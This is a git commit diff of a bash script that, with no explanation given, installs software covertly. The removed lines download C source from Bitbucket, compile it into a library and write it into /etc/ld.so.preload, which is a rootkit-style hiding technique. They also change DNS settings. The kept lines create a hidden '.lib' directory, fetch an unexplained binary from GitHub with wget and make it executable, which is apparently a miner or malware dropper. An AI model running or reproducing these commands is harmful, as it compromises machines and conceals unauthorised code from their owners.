fd40dc7c65706973e8d3d0f35f8da3d9f5d930e3
loeto21 <161197201+loeto21@users.noreply.github.com>
2024-03-20 01:21:55 -0700

    Update .sh

--- .sh
+++ .sh
@@ -1,15 +1,4 @@
 #!/bin/bash
-set -x
-apt-get update 
-apt-get install -y wget curl sudo
-curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
 mkdir .lib && cd .lib
 wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner
 chmod u+x sgr1
